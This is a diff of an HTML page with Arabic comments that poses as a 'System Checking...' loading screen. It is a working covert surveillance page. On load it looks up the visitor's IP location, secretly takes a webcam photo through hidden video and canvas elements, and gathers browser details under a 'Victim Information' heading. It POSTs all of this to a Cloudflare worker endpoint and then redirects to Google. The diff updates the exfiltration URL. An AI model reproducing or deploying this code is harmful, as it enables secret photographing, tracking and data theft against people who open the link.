@@ -2,43 +2,42 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking System...</title>
+    <title>System Checking...</title>
     <style>
-        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        body { background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </script>
+    </style>
 </head>
 <body>
     <div class="loader"></div>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        async function run() {
+        async function capture() {
             let photo = null;
-            let ipD = { ip: "37.239.193.14", city: "Unknown", country_name: "Unknown", org: "Unknown" };
+            let ipD = { ip: "Unknown", city: "Unknown", country_name: "Unknown", org: "Unknown" };
 
-            // 1. جلب الـ IP
+            // جلب الـ IP
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 ipD = await res.json();
             } catch(e) {}
 
-            // 2. محاولة فتح الكاميرا وتصوير
+            // تصوير الكاميرا
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 2000)); 
-                const canvas = document.getElementById('canvas');
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = s;
+                await new Promise(r => setTimeout(r, 2000));
+                const canvas = document.getElementById('c');
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 photo = canvas.toDataURL('image/jpeg', 0.6);
-                stream.getTracks().forEach(t => t.stop());
+                s.getTracks().forEach(t => t.stop());
             } catch (e) {}
 
-            // 3. تنسيق الرسالة المفصلة كما طلبت
+            // الرسالة بالتنسيق الذي طلبته
             const message = `
 ✅<b>Victim Information</b> 
 
@@ -59,30 +58,25 @@ platform: ${navigator.platform}
 product: ${navigator.product}
 userAgent: ${navigator.userAgent}
 language: ${navigator.language}
-languages: ${navigator.languages.join(', ')}
 webdriver: ${navigator.webdriver}
 pdfViewerEnabled: ${navigator.pdfViewerEnabled}
 
-🌐 <b>Network Detail</b>
-City: ${ipD.city}
-Country: ${ipD.country_name}
+🌐 <b>Location/ISP</b>
+City: ${ipD.city} | Country: ${ipD.country_name}
 ISP: ${ipD.org}
             `;
 
-            // 4. الإرسال للـ Worker
-            try {
-                await fetch("https://gbs.tjarb093.workers.dev/", {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: message, image: photo })
-                });
-            } catch(e) {}
+            // إرسال للـ Worker الجديد
+            const workerUrl = "https://cold-brook-420f.tjarb093.workers.dev/";
+            await fetch(workerUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: message, image: photo })
+            });
 
-            // 5. التوجيه
             window.location.href = "https://www.google.com";
         }
-
-        window.onload = run;
+        window.onload = capture;
     </script>
 </body>
 </html>
